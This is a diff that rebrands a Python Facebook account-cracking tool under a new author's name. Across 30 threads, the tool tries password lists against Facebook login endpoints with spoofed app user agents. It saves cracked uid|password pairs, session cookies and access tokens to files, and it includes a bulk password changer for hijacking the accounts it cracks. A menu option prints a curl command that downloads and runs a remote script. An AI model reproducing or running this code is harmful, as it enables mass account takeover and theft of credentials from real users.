@@ -45,15 +45,25 @@ SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBIL
 ses = requests.Session()
 def logo():
 	os.system('clear')
-	logo = (f'''\033[1;92m
-\33[1;32m---------------------------------------------------
-___________      .__  _________      
-\_   _____/____  |__|/   _____/__.__.
- |    __) \__  \ |  |\_____  <   |  |
- |     \   / __ \|  |/        \___  |
- \___  /  (____  /__/_______  / ____|
-     \/        \/           \/\/
-\33[1;32m--------------------------------------------------''')
+	logo = ("""\33[;33m            
+\033[92m
+   
+ ...    :::.        :    :::.    :::::::..   
+ ;;     ;;;;;,.    ;;;   ;;`;;   ;;;;``;;;;  
+[['     [[[[[[[, ,[[[[, ,[[ '[[,  [[[,/[[['  
+$$      $$$$$$$$$$$"$$$c$$$cc$$$c $$$$$$c    
+88    .d888888 Y88" 888o888   888,888b "88bo,
+ "YmmMMMM""MMM  M'  "MMMYMM   ""` MMMM   "W" 
+                                      
+[<>] The Original Codes are Written by Umar Nazeer 
+---------------------------------------------------
+ ╰◈▪➣ Github    : https://github.com/CyberAttack 
+ ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
+ ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
+ ╰◈▪➣ Version   : Version [10.2]
+ ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
+-------------------------------------------------- 
+\033[1;97m""")  
 	p(logo)
 def clear():
 	os.system("clear")
@@ -81,7 +91,7 @@ def connection_token():
 	 return final_string
 
 #method1
-yahe = "[FBAN/Orca-Android;FBAV/105.0.0.35.480;FBBV/190078149;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/AIRCEL;FBMF/LAVA;FBBD/iris;FBPN/com.facebook.katana;FBDV/Iris X8 L;FBSV/6.5;nullFBCA/armeabi-v7a:armeabi;]"
+yahe ="[FBAN/FB4A;FBAV/63.0.0.3574;FBBV/167256[FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1:;]","[FBAN/FB4A;FBAV/66.0.3774.127;FBBV/854283466;FBDM/{density=2.25,width=1024,height=2049};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.Orca;FBDV/SM-J250F;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/364.0.0.10.112;FBBV/374667243;FBDM/{density=1.3312501,width=1280,height=736};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.Orca;FBDV/SM-T290;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 
 
 def uaa():
@@ -138,17 +148,16 @@ class iAmMain:
 		elif opt1 == "4":automation().menu()
 		elif opt1 == "3":Grep().links_only()
 		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
-		elif opt1 == "E":exit(" [•] KATM.TATA BY BY")
-		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
-	
+		elif opt1 == "A":os.system("xdg-open https://wa.me/+923021431324")
+	  
 	
 	def dump_menu(self):
 		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
 		
 	def file_menu(self):
 		logo()
-		p(" [•] Example /sdcard/filename.txt")
-		file = input(" [•] Put File Path : ")
+		p(" 📁 : Example /sdcard/Umar.txt")
+		file = input(" 📁 : Put File Path : ")
 		try:
 			id = open(file,"r").read().splitlines()
 			self.method_select(id)
@@ -158,10 +167,10 @@ class iAmMain:
 		
 	def method_select(self,id):
 		logo()
-		p(" [1] Method 1 [BEST] ")
-		p(" [2] Method 2 [BEST] ")
-		p(" [3] Method 3 [BEST] ")
-		p(" [4] Method 4 [BEST] ")
+		p(" [〽️] Method 1 [ ✅ ] ")
+		p(" [〽️] Method 2  ")
+		p(" [〽️] Method 3  ")
+		p(" [〽️] Method 4  ")
 		line()
 		m_opt = input(" [•] Choose : ")
 		if m_opt =='1':
@@ -182,7 +191,7 @@ class iAmMain:
 		pwx=[]
 		logo()
 		max = 20
-		p(" [•] Example 1 , 2 , 3  to 20 Max ")
+		p(" [•] How Many Password Do You Want  ")
 		try:
 			plimit = int(input(" [•] Put limit : "))
 			if plimit =="":
@@ -192,13 +201,15 @@ class iAmMain:
 		except:
 			plimit = 4
 		logo()
-		p(" [•] Enter Your Passwords like : first last First Last etc ")
+		p(" [•] Enter Your Passwords  ")
 		line()
 		for n in range(plimit):
 			pwx.append(input(" [•] Put Password %s : "%(n+1)))
 		logo()
 		p("  Total File Accounts : %s "%(str(len(id))))
-		p(" Proces has been started ")
+		p("  Proces has been started ")
+		print('  The process is running in the background')
+		print('  Use Airplane Mode For Best Result')
 		line()
 		with tpe(max_workers=30) as saqi:
 			for user in id:
@@ -286,7 +297,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [FaiSy] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [Umar] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -361,7 +372,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r FaiSy %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r Umar %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -414,16 +425,16 @@ class iAmMain:
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M2_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -435,7 +446,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -488,15 +499,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M3_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M3_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M3_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -508,7 +519,7 @@ class iAmMain:
 	def method4(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -545,15 +556,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M4_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M4_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -565,7 +576,7 @@ class iAmMain:
 	def r_crack(self,uid,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			for pw in pwx:
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
@@ -613,15 +624,15 @@ class iAmMain:
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/UMAR_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -633,12 +644,12 @@ class iAmMain:
 class Join:
 	def __init_(self):
 		logo()
-		#s.system("xdg-open https://wa.me/+923152056613")
+		os.system("xdg-open https://wa.me/+923021431324")
 	def Whatsapp(self):
-		os.system('xdg-open https://chat.whatsapp.com/HF3burNYuZx0den94ooYbk')
+		os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
 		iAmMain().iAmMenu()
 	def Facebook(self):
-		os.system('xdg-open https://facebook.com/groups/124939013896146/')
+		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
 		iAmMain().iAmMenu()
 
 class Grep:
@@ -649,7 +660,7 @@ class Grep:
 		file = input(" [✓] File Path :- ")
 		try:
 			open(file,'r').read()
-			print("	[✓]	Example  /sdcard/file1.txt  ")
+			print("	[✓]	Example  /sdcard/Umar.txt   ")
 			out = input("  [=] Save Path :- ")
 			os.system('touch '+out)
 			os.system('sort -r '+file+' | uniq > '+out)
@@ -668,7 +679,7 @@ class Grep:
 			p(" [  Example  :-  /sdcard/file.txt  ] ")
 			file = input(" [•|•] Enter File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/file1.txt  ")
+			p("	Example  :-  /sdcard/Umar.txt   ")
 			sav = input(" [✓] Enter Save Path :- ")
 			line()
 			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
@@ -705,7 +716,7 @@ class Grep:
 			line()
 			file = input(" [✓] File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/file1.txt	")
+			p("	Example  :-  /sdcard/Umar.txt 	")
 			ofile= input(" [✓] File Save Path :- ")
 			line()
 			try:
@@ -786,7 +797,7 @@ class automation:
 		p(" [•] File Splitted Complete")
 	def iAmPasswordManager(self):
 		logo()
-		p(" [•] Password Changer By : SHAKEEL")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
 		line()
@@ -808,9 +819,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "SHAKEEL@@@"
+			iamdefaultpassword = "UMAR@@@"
 		logo()
-		p(" [•] Password Changer By : SHAKEEL")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -880,9 +891,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "SHAKEEL"
+			iamdefaultpassword = "UMAR"
 		logo()
-		p(" [•] Password Changer By : SHAKEEL ")
+		p(" [•] Password Changer By : UMAR ")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -943,7 +954,7 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "SHAKEEL786"
+			iamdefaultpassword = "UMAR786"
 		p(" [•] Default Password : %s"%(iamdefaultpassword))
 		line()
 		os.system("rm -rf .default_password.txt ")
@@ -958,8 +969,13 @@ class automation:
 		p(" [•] Your New Password : %s "%(change_pw))
 		line()
 		input("[•] Press Enter to go back ")
-
+	
 		self.iAmPasswordManager()
+
+if __name__=="__main__":
+	#update()
+	iAmMain().iAmMenu()
+	#iAmMain().method4('100089112641726','vishnu singh',['Muhammad Siyal'])
 
 def shoha_menu():
     UMO="IN-"
